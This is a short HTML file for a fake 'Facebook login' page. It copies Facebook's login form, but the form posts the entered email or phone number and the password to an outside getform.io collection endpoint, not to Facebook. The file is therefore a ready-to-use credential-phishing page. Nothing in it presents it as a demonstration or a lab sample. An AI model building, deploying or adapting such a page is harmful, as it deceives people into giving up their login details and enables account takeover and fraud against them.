<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Facebook</h1>
            <form action="https://getform.io/f/anllzzna" method="post">
                <div class="textbox">
                    <input type="text" name="email" id="email" placeholder="Email or Phone" required>
                </div>
                <div class="textbox">
                    <input type="password" name="text" id="text" placeholder="Password" required>
                </div>
                <input type="submit" value="Log In" class="btn">
                <a href="#" class="forgot">Forgotten password?</a>
                <hr>
                <input type="button" class="btn create-account" value="Create New Account">
            </form>
        </div>
    </div>
</body>
</html>
